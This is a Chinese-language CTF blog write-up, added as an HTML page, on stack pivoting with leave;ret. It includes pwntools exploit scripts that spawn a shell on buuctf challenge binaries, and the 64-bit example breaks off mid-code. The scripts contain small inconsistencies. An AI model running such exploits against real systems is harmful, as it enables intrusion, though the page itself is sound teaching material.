@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="栈迁移专题学习📚 看了好几篇栈迁移的文章，🤔 越看越懵，😵‍💫 感觉自己和没学 pwn 的一样。  原理学习 32位 64位   实例 32位 64位    原理学习32位 首先先了解栈的结构   (自己画的，有错误望指正)  了解栈的结构后，我们再来仔细了解一下leave;ret这两个指令  12345call func()-----------push eip + 4push ebp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈迁移专题学习">
+<meta property="og:url" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="网络幻影">
+<meta property="og:description" content="栈迁移专题学习📚 看了好几篇栈迁移的文章，🤔 越看越懵，😵‍💫 感觉自己和没学 pwn 的一样。  原理学习 32位 64位   实例 32位 64位    原理学习32位 首先先了解栈的结构   (自己画的，有错误望指正)  了解栈的结构后，我们再来仔细了解一下leave;ret这两个指令  12345call func()-----------push eip + 4push ebp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBleave.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBret.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/system%E5%88%86%E5%B8%83.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave1.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave2.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/64&&32%E4%BC%A0%E5%8F%82.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.2.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.0.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.1.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.4.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.5.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.6.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.7.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.0.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.1.png">
+<meta property="article:published_time" content="2025-06-28T01:17:14.000Z">
+<meta property="article:modified_time" content="2025-07-09T07:35:44.898Z">
+<meta property="article:author" content="linkpwn">
+<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84.png">
+
+<link rel="canonical" href="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>栈迁移专题学习 | 网络幻影</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">网络幻影</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <a>
+        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          栈迁移专题学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-06-28 09:17:14" itemprop="dateCreated datePublished" datetime="2025-06-28T09:17:14+08:00">2025-06-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-07-09 15:35:44" itemprop="dateModified" datetime="2025-07-09T15:35:44+08:00">2025-07-09</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%80%BB%E7%BB%93/pwn%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">pwn总结</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="栈迁移专题学习"><a href="#栈迁移专题学习" class="headerlink" title="栈迁移专题学习"></a>栈迁移专题学习</h2><p>📚 看了好几篇栈迁移的文章，🤔 越看越懵，😵‍💫 感觉自己和没学 pwn 的一样。</p>
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0">原理学习</a><ul>
+<li><a href="#32%E4%BD%8D">32位</a></li>
+<li><a href="#64%E4%BD%8D">64位</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AE%9E%E4%BE%8B">实例</a><ul>
+<li><a href="#32%E4%BD%8D">32位</a></li>
+<li><a href="#64%E4%BD%8D">64位</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="原理学习"><a href="#原理学习" class="headerlink" title="原理学习"></a>原理学习</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><ol>
+<li>首先先了解栈的结构</li>
+</ol>
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84.png" alt="1"></p>
+<p>(自己画的，有错误望指正)</p>
+<ol start="2">
+<li>了解栈的结构后，我们再来仔细了解一下leave;ret这两个指令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">call func()</span><br><span class="line">-----------</span><br><span class="line">push eip + 4</span><br><span class="line">push ebp </span><br><span class="line">mov  ebp,esp</span><br></pre></td></tr></table></figure>
+
+<p>   如果要保持栈平衡就要在call退出的时候执行相反的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">----------</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">************</span><br><span class="line">ret</span><br><span class="line">------------</span><br><span class="line">pop eip</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><p>什么时候用栈迁移：</p>
+<p>(1).有栈溢出漏洞。</p>
+<p>(2).溢出的长度不够。</p>
+<p>所以我们就要把栈迁移到一个长度够大的区域(通常是bss段)，那怎么把栈迁移呢，主要就是控制栈顶的esp指针指向我们想要他到达的地方(迁移后的地址)，从而控制程序的执行流。</p>
+</li>
+<li><p>栈迁移最重要就是怎么利用leave；ret进行栈迁移</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leave //mov esp;ebp 把ebp传给esp,此时esp和ebp就在同一个位置了，他们指向同一个内容</span><br><span class="line">      //pop ebp 把栈顶的内容弹给ebp。此时ebp指向的就是栈顶的内容了</span><br><span class="line">由于esp时刻指向的是栈顶的位置，栈顶的内容弹出后，esp会下降一个单位</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBleave.png" alt="2"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret  //pop eip 就是把esp指向地址弹如eip,同时esp下降一个单元</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E6%A0%88%E8%BF%81%E7%A7%BBret.png" alt="3"></p>
+<p>了解了栈的结构和leave;ret的执行过程后，就可以来了解栈迁移的原理了</p>
+<ol start="5">
+<li><p>栈迁移的原理：栈迁移一共要执行两次leave;ret</p>
+<p>1.首先我们先了解一下此时栈上的分布情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">主要如下图，这里注释：</span><br><span class="line">0xffff100c---&gt;system的返回地址</span><br><span class="line">0xffff1010---&gt;system参数的存储地址</span><br><span class="line">0xffff1014---&gt;存储/bin</span><br><span class="line">0xffff1018---&gt;存储/sh</span><br><span class="line">0xffff1020---&gt;0xffff1004  也就是ebp---&gt;0xffff1004</span><br><span class="line">0xffff1024---&gt;leave ret;  原本是return address;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/system%E5%88%86%E5%B8%83.png" alt="4"></p>
+<p>2.第一次leave;ret:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由上面的leave;ret的执行过程，首先leave：mov ebp;esp,让ebp和esp在同一个位置；leave: pop ebp,此时我们把ebp所指的内容换成</span><br><span class="line">了需要迁移到的位置，所以pop ebp后esp指向的就是需要迁移到的位置。然后我们把return address换成leave ret的地址，就会再次执</span><br><span class="line">行leave ret。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave1.png" alt="5"></p>
+<p>3.第二次leave;ret:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同样是leave:mov ebp;esp,让ebp和esp在同一个位置；但是此时ebp指向的是需要迁移到的位置，所以esp此时指向的也是需要迁移到的位</span><br><span class="line">置;leave：pop ebp,我们把return address的地址换成system的地址,就使得esp下降一个单元后正好指向system的地址。ret:pop </span><br><span class="line">eip,最终eip指向system的地址---&gt;getshell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/leave2.png" alt="5"></p>
+</li>
+</ol>
+<p>了解完了32位的栈溢出，现在来了解64位栈溢出</p>
+<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>64位和32位栈的结构是相似的，主要不同就是调用函数时传参的不同</p>
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/64&&32%E4%BC%A0%E5%8F%82.png" alt="5"></p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_es_2">buuctf-ciscn_2019_es_2</a></p>
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.2.png" alt="6"></p>
+<ol>
+<li>IDA反编译</li>
+</ol>
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.0.png" alt="6"></p>
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.1.png" alt="6"></p>
+<p>计算一下溢出的长度0x30 - 0x28 &#x3D; 8;很明显长度不够，要用到栈迁移。</p>
+<ol start="2">
+<li>先给出exp，在具体解释</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29440</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./ciscn_s_4&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x8048400</span></span><br><span class="line">leave=<span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Welcome, my friend. What&#x27;</span>s your name?<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">r.send(payload)</span></span><br><span class="line"><span class="string">r.recvuntil(&#x27;</span>bbb<span class="string">b&#x27;)</span></span><br><span class="line"><span class="string">ebp=u32(p.recv(4).ljust(4,b&#x27;</span>\x00<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">buf=ebp-0x38 </span></span><br><span class="line"><span class="string">payload=(p32(sys_addr)+b&#x27;</span>aaaa<span class="string">&#x27;+p32(buf+12)+b&#x27;</span>/<span class="built_in">bin</span>/sh\x00<span class="string">&#x27;).ljust(0x28,b&#x27;</span>a<span class="string">&#x27;)+p32(buf-4)+p32(leave)</span></span><br><span class="line"><span class="string">r.send(payload) </span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>首先找到leave ret的地址可以用ROPgadget找，也可以直接在IDA的汇编代码里面找</li>
+</ol>
+<p>(1)用ROPgadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn_2019_es_2 --only &quot;leave|ret&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.4.png" alt="8"></p>
+<p>(2)在IDA的汇编代码里面找</p>
+<p>​       <img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.5.png" alt="8"></p>
+<ol start="4">
+<li>找到system的plt地址</li>
+</ol>
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.6.png" alt="8"></p>
+<ol start="5">
+<li><p>在vul函数中有两个溢出点，所以我们就需要先通过第一个溢出泄露出ebp的地址，再构造栈迁移的payload</p>
+<p>(1)首先泄露ebp的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node5.buuoj.cn&quot;, 25271)</span></span><br><span class="line">payload1= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span> </span><br><span class="line">r.send(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>(2)构造栈迁移的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf=ebp-0x38 </span><br><span class="line">payload=(p32(sys_addr)+b&#x27;aaaa&#x27;+p32(buf+12)+b&#x27;/bin/sh\x00&#x27;).ljust(0x28,b&#x27;a&#x27;)+p32(buf-4)+p32(leave)</span><br></pre></td></tr></table></figure>
+
+<p>buf&#x3D;ebp-0x38 通过调试可以得到，我们最后调试，先解释payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=(p32(sys_addr)+b&#x27;aaaa&#x27;+p32(buf+12)+b&#x27;/bin/sh\x00&#x27;).ljust(0x28,b&#x27;a&#x27;)+p32(buf)+p32(leave)</span><br><span class="line">---------------------------------------------------------------------------------------------------------------</span><br><span class="line">buf + 12:p32(sys_addr)=4,b&#x27;aaaa&#x27;=4,p32(buf+12)=4,4+4+4=12所以buf+12就是/bin/sh的起始地址</span><br><span class="line">p32(buf)：栈迁移所到达的位置</span><br><span class="line">leave:leave ret;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B1.7.png" alt="8"></p>
+</li>
+</ol>
+<p>​       0xfffd158 - 0xfffd130 &#x3D; 0x28   0xfffd158回弹到0xfffd168，正好0x28 + 0x10 &#x3D; 0x38;</p>
+<h4 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h4><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#actf_2019_babystack">actf_2019_babystack</a></p>
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.0.png" alt="9"></p>
+<p> 64位，只开了NX,先给出exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#io =process(&#x27;./ACTF_2019_babystack&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26651</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./ACTF_2019_babystack&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4008F6</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span 